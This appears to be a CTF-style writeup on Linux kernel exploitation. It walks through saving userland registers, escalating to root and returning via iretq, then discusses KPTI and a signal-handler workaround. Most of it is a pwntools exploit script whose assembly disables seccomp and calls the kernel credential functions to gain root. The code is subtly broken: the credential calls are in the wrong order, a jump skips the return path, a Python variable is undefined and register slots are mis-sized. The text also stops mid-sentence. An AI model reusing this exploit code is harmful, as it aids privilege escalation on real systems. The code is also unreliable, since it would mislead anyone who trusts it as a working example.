# 🐚 Kernel Pwn: Jumping from Userland to Kernel and Back

In kernel exploitation challenges, you often need to **jump from userland to kernel space**, perform privileged actions, and then **safely return** to userland. This writeup provides a working example and some hard-earned lessons.

---

## 🧠 The Idea

You must **save userland state** (registers like `cs`, `ss`, `rsp`, `rflags`, and `rip`) before transitioning into kernel space. Then, in kernel space, elevate privileges, and finally **restore the saved context** to safely return via `iretq`.

If you skip this — like I initially did — you'll get a lovely `SIGSEGV` from `iretq`.

---

## 🔧 Code Snippet

### Python Exploit (Pwntools)

```python
from pwn import *
import os

context.arch = 'amd64'

# Target binary
path = 'some_binary'
p = process(path)

payload = asm(f"""
    ; Save userland segment and context values
    lea r15 , [rip+user_ss]
    mov rax, ss
    mov [r15], rax

    lea r15, [rip+user_sp]
    mov rax, rsp
    mov [r15], rax

    lea r15, [rip+user_rflags]
    pushfq
    pop rax
    mov [r15], rax

    lea r15, [rip+user_cs]
    mov rax, cs
    mov [r15], rax

    ; Write shellcode into opened FD (3)
    mov rdi, 3
    lea rsi, [rip + shellcode]
    mov rdx, 150
    mov rax, 1
    syscall

    ; Trigger syscall to run shellcode in kernel
    push 0x66
    mov rdi, rsp
    push 4
    pop rsi
    push 90
    pop rax
    syscall

    ret

shellcode:
    ; Disable seccomp by flipping bit at current_task->seccomp
    mov rax, qword ptr gs:0x15d00
    and qword ptr [rax], 0xfffffffffffffeff

    ; Typical get-root pattern
    mov rax, commit_cred()
    xor rdi, rdi
    call rax
    mov rdi, rax
    mov rax, prepare_kernel_cred()
    jmp rax

    ; Return to userland
    swapgs
    xor r15, r15
    mov r15, [rip + user_ss]
    push r15
    xor r15, r15
    mov r15, [rip + user_sp]
    push r15
    xor r15, r15
    mov r15, [rip + user_rflags]
    push r15
    xor r15, r15
    mov r15, [rip + user_cs]
    push r15
    mov r15, [rip + user_rip]
    push r15
    iretq

user_cs:
    .byte  0x00
user_ss:
    .byte  0x00
user_sp:
    .quad  0x00
user_rflags:
    .word  0x0000
user_rip:
    .qword return_address

binsh:
    .string "/flag"
""")

# Write shellcode to file (unrelated to main exploit flow)
with open('file2', 'wb') as f:
    f.write(shellcode)

# Send the payload
p.sendline(payload)
os.system('cat /flag')
```

---

## 🧪 Debugging

When debugging with GDB, check `gs`-based offsets:

```gdb
(gdb) p/x &current_task
$21 = 0x0 gs:offset
```

This confirms where `gs:0x15d00` points (it should point to `current_task->seccomp`, which you clear with `and [rax], ~0x100`).

---

## ⚠️ Watch Out: `iretq` and KPTI

I lost hours figuring out why I kept segfaulting on `iretq`...

Turns out: **`iretq` needs 5 things on the stack** (in this order):

1. `ss`  
2. `rsp`  
3. `rflags`  
4. `cs`  
5. `rip`

If you miss one, or the values are garbage — say hello to `SIGSEGV`.

Also:  
If you're running on a Linux kernel ≥ 4.15, KPTI (Kernel Page Table Isolation) a.k.a. **KAISER**, will cause `iretq` to fail unless you're handling the page table switch correctly.

---

## 🩹 Workaround: Use a Signal Handler

Thanks to [@ntrung03](https://github.com/TrungNguyen1909) for this trick:  
Use a **signal handler** to handle return to userland cleanly.

Writeup:  
🔗 https://github.com/TrungNguyen1909/writeups/blob/master/matesctf/KSMASH/exploit.c  
Blog:  
📝 https://trungnguyen1909.github.io/blog/post/matesctf/KSMASH/

> Highly recommend reading his KSMASH writeup — very insightful.

---

## ✅ TL;DR

- Save userland state (`cs`, `ss`, `rsp`, `rflags`, `rip`)
- Use `iretq` properly with
